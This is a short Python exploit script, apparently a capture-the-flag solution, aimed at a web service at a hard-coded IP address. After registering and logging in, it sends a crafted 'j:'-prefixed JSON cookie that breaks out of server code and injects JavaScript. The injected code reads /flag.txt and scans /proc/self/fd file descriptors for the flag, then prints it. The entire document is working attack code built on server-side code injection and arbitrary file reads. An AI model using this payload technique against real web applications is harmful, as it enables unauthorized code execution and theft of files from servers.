#!/usr/bin/env python3
import requests
import json
import urllib.parse
import time

target = "http://65.21.255.24:5002"

s = requests.session()
s.post(f"{target}/register",json={"username":"lolzsdfasdfsd1337","password":"lolz1337"})
s.post(f"{target}/login",json={"username":"lolzsdfasdfsd1337","password":"lolz1337"})

for i in range(5):
	payload = ["1",'])//']
	payload.append("""
		while(1){
			readFile('/flag.txt')
		}
	//""")
	payload.append('\n//')
	payload = json.dumps(payload) 
	payload = 'j:'+urllib.parse.quote(payload)

	requests.get(f"{target}/checkout",cookies={"uid":"0b1","passwd":s.cookies["passwd"],"order":payload})
	time.sleep(1)
	
payload = ["1",'])//']
payload.append("""
	k = null
	for(let i=0;i<100;i++){
		try{
		g = readFile('/proc/self/fd/'+i).toString()
		if(g.includes('ASIS')){
			k = g
			break
		}
		} catch(e){}
	}
	k
//""")

payload.append('\n//')
payload = json.dumps(payload) 
payload = 'j:'+urllib.parse.quote(payload)

r = requests.get(f"{target}/checkout",cookies={"uid":"0b1","passwd":s.cookies["passwd"],"order":payload})
print(r.text)


# r = s.get(f"{target}/checkout")
# print(r.text)
# r = requests.post(f"{target}/login",json={"username":"af","password":"a"})
# print(r.text,r.cookies)
